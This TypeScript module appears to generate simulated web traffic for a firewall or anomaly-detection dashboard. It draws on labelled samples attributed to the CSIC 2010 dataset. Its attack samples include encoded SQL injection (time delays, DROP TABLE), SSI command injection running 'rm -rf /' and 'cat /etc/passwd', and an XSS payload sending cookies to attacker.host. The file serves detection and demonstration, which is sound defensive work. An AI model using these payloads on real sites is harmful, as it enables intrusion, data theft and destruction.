
export const DATASET_TOTALS = {
  total: 61000,
  valid: 36000,
  anomalous: 25000
};

export const FAKE_IPS = [
  "192.168.1.1", "10.0.0.12", "172.16.254.1", "45.33.22.11", 
  "88.99.100.12", "201.12.33.44", "92.111.45.6", "12.4.5.6",
  "142.250.190.46", "31.13.71.36", "157.240.22.35", "104.244.42.193",
  "185.60.216.35", "23.235.46.133", "52.84.162.119", "205.251.242.103",
  "1.1.1.1", "8.8.8.8", "212.58.244.70", "13.107.42.12"
];

export const IP_TO_COUNTRY: Record<string, string> = {
  "192.168.1.1": "US", "10.0.0.12": "US", "172.16.254.1": "DE", "45.33.22.11": "UK",
  "88.99.100.12": "RU", "201.12.33.44": "BR", "92.111.45.6": "FR", "12.4.5.6": "CN",
  "142.250.190.46": "US", "31.13.71.36": "IE", "157.240.22.35": "SG", "104.244.42.193": "US",
  "185.60.216.35": "NL", "23.235.46.133": "US", "52.84.162.119": "JP", "205.251.242.103": "US",
  "1.1.1.1": "AU", "8.8.8.8": "US", "212.58.244.70": "UK", "13.107.42.12": "US"
};

// Consolidated real CSIC 2010 Parsed Samples (Valid Traffic)
export const CSIC_VALID_SAMPLES = [
  { method: "GET", url: "/tienda1/imagenes/nuestratierra.jpg", payload: "Cookie: JSESSIONID=1DAB65B0324F0B760D56507C0FFCD929", id: "V-7704" },
  { method: "GET", url: "/tienda1/publico/registro.jsp?modo=registro&login=sikander&password=2eSCo63ENti2&dni=19064192K", payload: "Cookie: JSESSIONID=8CD26B5FBF3F555875293CA8CA90F199", id: "V-13515" },
  { method: "GET", url: "/tienda1/miembros/imagenes/zarauz.jpg", payload: "Cookie: JSESSIONID=3BB7D3CFA4883626F142D5A83A97EDC3", id: "V-12445" },
  { method: "GET", url: "/tienda1/publico/autenticar.jsp?modo=entrar&login=chuang&pwd=visionario&remember=on&B1=Entrar", payload: "Cookie: JSESSIONID=29BDC1A4215FA40AC619614130C4A037", id: "V-35896" },
  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito", payload: "Cookie: JSESSIONID=E535831273DD8A3D1C0D9932FA59F59C", id: "V-737" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=janna&pwd=eusquero&remember=off&B1=Entrar", id: "V-16025" },
  { method: "POST", url: "/tienda1/publico/caracteristicas.jsp", payload: "id=1", id: "V-10915" },
  { method: "GET", url: "/tienda1/miembros/index.jsp", payload: "Cookie: JSESSIONID=C61FBBEEE45E049ABE4DB9B7E1B47D54", id: "V-7082" },
  { method: "GET", url: "/tienda1/imagenes/logo.gif", payload: "Cookie: JSESSIONID=A53D159B0F23CDF15AF7AF825C939170", id: "V-11591" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=dyment&password=Z5R1174oSa", id: "V-21484" },
  { method: "POST", url: "/tienda1/publico/anadir.jsp", payload: "id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=98", id: "V-23259" },
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=1126&B1=Pasar+por+caja", id: "V-20713" },
  { method: "GET", url: "/tienda1/index.jsp", payload: "Cookie: JSESSIONID=F43C7CD943DE7B1C20D3A9896C463DFB", id: "V-13033" },
  { method: "POST", url: "/tienda1/publico/entrar.jsp", payload: "errorMsg=Credenciales+incorrectas", id: "V-3286" },
  { method: "GET", url: "/tienda1/miembros/imagenes/ogono.jpg", payload: "Accept: image/jpeg", id: "V-11940" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=karola5&password=conciliador", id: "V-5536" },
  { method: "POST", url: "/tienda1/publico/registro.jsp", payload: "modo=registro&login=dueppen&password=lI74Re04", id: "V-2212" },
  { method: "GET", url: "/tienda1/global/creditos.jsp", payload: "Accept: text/html", id: "V-11359" }
];

// Consolidated real CSIC 2010 Parsed Samples (Anomalous/Attack Traffic)
export const CSIC_ANOMALOUS_SAMPLES = [
  // SQL Injection
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=janey&password=3s3%27+AND+%271%27%3D%271&B1=Registrar", attackType: "SQL Injection", score: 0.94, id: "A-21369" },
  { method: "GET", url: "/tienda1/publico/registro.jsp", payload: "email=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.98, id: "A-3620" },
  { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=insertar&precio=1012%27INJECTED_PARAM&B1=Pasar+por+caja", attackType: "SQL Injection", score: 0.96, id: "A-23333" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=etoh&password=3Nt783E68r&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25", attackType: "SQL Injection", score: 0.99, id: "A-6934" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=hauersto%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.98, id: "A-7596" },
  { method: "POST", url: "/tienda1/publico/anadir.jsp", payload: "id=3&nombre=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.99, id: "A-21488" },
  { method: "GET", url: "/tienda1/publico/caracteristicas.jsp?id=%27OR%27a%3D%27a", attackType: "SQL Injection", score: 0.92, id: "A-1642" },
  
  // Command Injection / SSI
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=88&B1=Confirmar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E", attackType: "Command Injection", score: 0.97, id: "A-14799" },
  { method: "POST", url: "/tienda1/publico/entrar.jsp", payload: "errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E", attackType: "Command Injection", score: 0.99, id: "A-16272" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=arro&pwd=CarMinAR%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E", attackType: "Command Injection", score: 0.96, id: "A-1174" },
  
  // XSS
  { method: "GET", url: "/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E", attackType: "XSS", score: 0.95, id: "A-16089" },
  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D123%26username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.host%2Fcookie.cgi%3F%27%2Bdocument.cookie%3C%2Fscript%3E", attackType: "XSS", score: 0.99, id: "A-23991" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=ardoin&pwd=antroponimi6any%250D%250ASet-cookie%253A%2BTamper%253D123", attackType: "XSS", score: 0.96, id: "A-19086" },
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=6027&B1=Confirmar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E", attackType: "XSS", score: 0.97, id: "A-7122" },
  
  // Path Traversal / Sensitive Exposure
  { method: "GET", url: "/tienda1/4861362529278789730.java", attackType: "Path Traversal", score: 0.91, id: "A-12371" },
  { method: "GET", url: "/tienda1/global/asf-logo-wide.gif.bak", attackType: "Path Traversal", score: 0.93, id: "A-20884" },
  { method: "GET", url: "/tienda1/.INC", attackType: "Path Traversal", score: 0.96, id: "A-1488" },
  { method: "GET", url: "/tienda1.Bak", attackType: "Path Traversal", score: 0.92, id: "A-8215" },
  { method: "GET", url: "/_vti_cnf/", attackType: "Path Traversal", score: 0.95, id: "A-23327" },
  
  // Parameter / Method Tampering
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precioA=9801&B1=Pasar+por+caja", attackType: "Parameter Tampering", score: 0.85, id: "A-21266" },
  { method: "PUT", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=usa9&password=ENjuaGaDiEnTES", attackType: "Method Tampering", score: 0.90, id: "A-18466" },
  { method: "POST", url: "/tienda1/publico/anadir.jsp", payload: "id=3&nombreA=Vino+Rioja&precio=100&cantidad=81", attackType: "Parameter Tampering", score: 0.82, id: "A-22878" }
];

export function getRandomElement<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

export function generateFakeRequest(timestampOverride?: string) {
  const roll = Math.random();
  // Matching dataset split: ~40% anomalous for live simulation to keep it interesting
  let decision: 'SAFE' | 'BLOCKED' | 'SUSPICIOUS' = 'SAFE';
  let sample;
  
  if (roll > 0.60) {
    decision = 'BLOCKED';
    sample = getRandomElement(CSIC_ANOMALOUS_SAMPLES);
  } else if (roll > 0.50) {
    decision = 'SUSPICIOUS';
    const validBase = getRandomElement(CSIC_VALID_SAMPLES);
    sample = { ...validBase, attackType: 'Suspicious Anomaly', score: 0.65, payload: "Malformed Context: " + validBase.payload };
  } else {
    decision = 'SAFE';
    const validBase = getRandomElement(CSIC_VALID_SAMPLES);
    sample = { ...validBase, attackType: 'Safe', score: 0.05, payload: validBase.payload };
  }

  const ip = getRandomElement(FAKE_IPS);
  
  // ENSURE ABSOLUTE KEY UNIQUENESS
  const entropy = Math.random().toString(36).substring(2, 10);
  const uniqueId = `${sample.id}-${entropy}-${Date.now() % 100000}`;

  return {
    id: uniqueId,
    timestamp: timestampOverride || new Date().toISOString(),
    ip: ip,
    country: IP_TO_COUNTRY[ip] || "US",
    endpoint: sample.url,
    method: sample.method,
    attackType: (sample as any).attackType || 'Safe',
    score: (sample as any).score || 0.05,
    decision: decision,
    inferenceTime: Math.floor(Math.random() * 8) + 2,
    payload: sample.payload || "Dataset Context: CSIC-2010"
  };
}

export function getSeededData() {
  const data = [];
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  
  for (let i = 0; i < 200; i++) {
    const timestamp = new Date(now - Math.random() * oneDay).toISOString();
    data.push(generateFakeRequest(timestamp));
  }
  
  return data.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}
